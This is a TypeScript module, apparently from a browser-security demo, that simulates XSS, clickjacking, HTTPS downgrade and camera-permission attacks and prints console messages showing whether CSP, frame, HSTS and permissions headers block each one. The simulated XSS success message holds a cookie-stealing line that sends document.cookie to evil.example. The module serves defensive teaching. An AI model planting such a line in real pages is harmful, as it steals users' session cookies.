import type { ConsoleMessage } from './console';

export type AttackId = 'xss' | 'clickjack' | 'downgrade' | 'camera';

export const ATTACKS: readonly { id: AttackId; guard: string }[] = [
  { id: 'xss', guard: 'csp' },
  { id: 'clickjack', guard: 'frame' },
  { id: 'downgrade', guard: 'hsts' },
  { id: 'camera', guard: 'permissions' },
];

export function isBlocked(id: AttackId, enabled: readonly string[]): boolean {
  const guard = ATTACKS.find((attack) => attack.id === id)?.guard;
  return guard !== undefined && enabled.includes(guard);
}

const LOGS: Record<AttackId, { blocked: string; succeeded: string }> = {
  xss: {
    blocked:
      'Refused to execute inline script because it violates the Content Security Policy directive: "script-src \'self\'".',
    succeeded: "fetch('https://evil.example/steal?c=' + document.cookie) sent session cookie.",
  },
  clickjack: {
    blocked:
      "Refused to display 'https://zerno.preview.example/' in a frame because it set 'X-Frame-Options' to 'deny'.",
    succeeded: 'https://evil.example framed https://zerno.preview.example/checkout at opacity 0.',
  },
  downgrade: {
    blocked: 'Non-authoritative 307 Internal Redirect to https:// (HSTS).',
    succeeded: 'Form submitted over insecure http:// — credentials sent in plain text.',
  },
  camera: {
    blocked: 'Permissions policy violation: camera is not allowed in this document.',
    succeeded: 'evil.example widget requested permission: camera.',
  },
};

export function attackLog(id: AttackId, blocked: boolean): ConsoleMessage {
  return {
    level: blocked ? 'error' : 'warning',
    text: LOGS[id][blocked ? 'blocked' : 'succeeded'],
    source: blocked ? 'security' : 'evil.js:1',
  };
}
